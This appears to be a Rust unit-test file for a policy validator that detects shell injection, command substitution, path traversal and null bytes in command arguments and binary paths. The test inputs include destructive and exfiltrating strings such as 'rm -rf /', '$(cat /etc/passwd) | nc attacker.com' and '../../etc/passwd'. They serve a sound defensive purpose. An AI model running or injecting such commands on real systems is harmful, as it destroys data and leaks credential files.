use carapace_policy::PolicyValidator;

#[test]
fn test_shell_injection_semicolon() {
    // Semicolon allows command chaining
    assert!(PolicyValidator::has_dangerous_shell_chars(";"));
    assert!(PolicyValidator::has_dangerous_shell_chars("rm /data;"));
    assert!(PolicyValidator::has_dangerous_shell_chars("safe; rm -rf /"));
}

#[test]
fn test_shell_injection_pipe() {
    assert!(PolicyValidator::has_dangerous_shell_chars("|"));
    assert!(PolicyValidator::has_dangerous_shell_chars("cmd | cat"));
}

#[test]
fn test_shell_injection_logical_and() {
    assert!(PolicyValidator::has_dangerous_shell_chars("&&"));
    assert!(PolicyValidator::has_dangerous_shell_chars("test && rm -rf /"));
}

#[test]
fn test_shell_injection_logical_or() {
    assert!(PolicyValidator::has_dangerous_shell_chars("||"));
}

#[test]
fn test_command_substitution_dollar_paren() {
    assert!(PolicyValidator::has_dangerous_shell_chars("$("));
    assert!(PolicyValidator::has_dangerous_shell_chars("$(whoami)"));
}

#[test]
fn test_command_substitution_backtick() {
    assert!(PolicyValidator::has_dangerous_shell_chars("`"));
    assert!(PolicyValidator::has_dangerous_shell_chars("`cat /etc/passwd`"));
}

#[test]
fn test_environment_variable_expansion_dollar() {
    assert!(PolicyValidator::has_dangerous_shell_chars("$"));
    assert!(PolicyValidator::has_dangerous_shell_chars("$HOME"));
    assert!(PolicyValidator::has_dangerous_shell_chars("${VAR}"));
}

#[test]
fn test_redirection_input() {
    assert!(PolicyValidator::has_dangerous_shell_chars("<"));
    assert!(PolicyValidator::has_dangerous_shell_chars("< /etc/passwd"));
}

#[test]
fn test_redirection_output() {
    assert!(PolicyValidator::has_dangerous_shell_chars(">"));
    assert!(PolicyValidator::has_dangerous_shell_chars("> /tmp/output"));
}

#[test]
fn test_redirection_append() {
    assert!(PolicyValidator::has_dangerous_shell_chars(">>"));
}

#[test]
fn test_newline_injection() {
    assert!(PolicyValidator::has_dangerous_shell_chars("cmd\nnewcmd"));
    assert!(PolicyValidator::has_dangerous_shell_chars("text\r\ntext"));
}

#[test]
fn test_path_traversal_relative() {
    let result = PolicyValidator::validate_binary_path("../../etc/passwd");
    assert!(result.is_err(), "Should reject path traversal");
}

#[test]
fn test_path_traversal_multiple_levels() {
    let result = PolicyValidator::validate_binary_path("/usr/../../../etc/passwd");
    assert!(result.is_err(), "Should reject multi-level traversal");
}

#[test]
fn test_null_byte_in_path() {
    let result = PolicyValidator::validate_binary_path("/usr/bin/tool\0hidden");
    assert!(result.is_err(), "Should reject null bytes");
}

#[test]
fn test_valid_binary_path() {
    let result = PolicyValidator::validate_binary_path("/usr/bin/gh");
    assert!(result.is_ok(), "Should allow valid paths");
}

#[test]
fn test_valid_binary_with_dash() {
    let result = PolicyValidator::validate_binary_path("/usr/bin/my-tool");
    assert!(result.is_ok());
}

#[test]
fn test_valid_binary_with_underscore() {
    let result = PolicyValidator::validate_binary_path("/usr/local/bin/my_custom_tool");
    assert!(result.is_ok());
}

#[test]
fn test_binary_hijacking_attempt() {
    // Attacker tries to hijack by traversing to /tmp
    let result = PolicyValidator::validate_binary_path("../../../tmp/malicious");
    assert!(result.is_err(), "Should detect traversal attempts");
}

#[test]
fn test_stdin_with_shell_commands() {
    // stdin can be used to inject commands
    let malicious_stdin = "normal input\n; rm -rf /\n";
    assert!(PolicyValidator::has_dangerous_shell_chars(malicious_stdin));
}

#[test]
fn test_argument_with_shell_metachar() {
    // Individual arguments with dangerous chars
    assert!(PolicyValidator::has_dangerous_shell_chars("arg;othercommand"));
    assert!(PolicyValidator::has_dangerous_shell_chars("arg|tee"));
    assert!(PolicyValidator::has_dangerous_shell_chars("arg&&rm"));
}

#[test]
fn test_safe_arguments() {
    // Normal arguments should not be flagged
    assert!(!PolicyValidator::has_dangerous_shell_chars("normal-argument"));
    assert!(!PolicyValidator::has_dangerous_shell_chars("argument_with_underscore"));
    assert!(!PolicyValidator::has_dangerous_shell_chars("argument123"));
    assert!(!PolicyValidator::has_dangerous_shell_chars("argument.with.dots"));
}

#[test]
fn test_quoted_argument_still_dangerous() {
    // Even quoted arguments containing dangerous chars should be flagged
    assert!(PolicyValidator::has_dangerous_shell_chars("'$(whoami)'"));
    assert!(PolicyValidator::has_dangerous_shell_chars("\"test|pipe\""));
}

#[test]
fn test_env_var_expansion_in_argument() {
    assert!(PolicyValidator::has_dangerous_shell_chars("prefix$SUFFIX"));
    assert!(PolicyValidator::has_dangerous_shell_chars("${HOME}/file"));
}

#[test]
fn test_glob_expansion_attempt() {
    // Globbing isn't technically a shell metachar for injection, but * is used
    let has_danger = PolicyValidator::has_dangerous_shell_chars("*");
    // * is not in the DANGEROUS_CHARS list, so it should be safe
    assert!(!has_danger);
}

#[test]
fn test_combined_injection_vectors() {
    // Multiple injection techniques combined
    assert!(PolicyValidator::has_dangerous_shell_chars("; $(cat /etc/passwd) | nc attacker.com"));
}

#[test]
fn test_unicode_with_injection() {
    // Unicode + injection
    assert!(PolicyValidator::has_dangerous_shell_chars("你好; rm -rf /"));
}

#[test]
fn test_very_long_malicious_argument() {
    let long_malicious = "x".repeat(10000) + "$(whoami)";
    assert!(PolicyValidator::has_dangerous_shell_chars(&long_malicious));
}

#[test]
fn test_space_encoding_bypass() {
    // Attempting to bypass space-based detection
    // These might not be detected by our simple check, which is why we also validate at policy level
    let encoded = "cmd%20arg"; // URL encoded space
    assert!(!PolicyValidator::has_dangerous_shell_chars(encoded));
}

#[test]
fn test_tab_character_injection() {
    assert!(PolicyValidator::has_dangerous_shell_chars("arg\tcmd"));
}

#[test]
fn test_carriage_return_injection() {
    assert!(PolicyValidator::has_dangerous_shell_chars("arg\rcmd"));
}

#[test]
fn test_form_feed_character() {
    let ff = "arg\u{000C}cmd";
    // Form feed might not be in DANGEROUS_CHARS, check the implementation
    let has_danger = PolicyValidator::has_dangerous_shell_chars(ff);
    // Form feed is not in our list, so it won't be caught, but that's okay
    // because it's not typically dangerous for shell injection
}
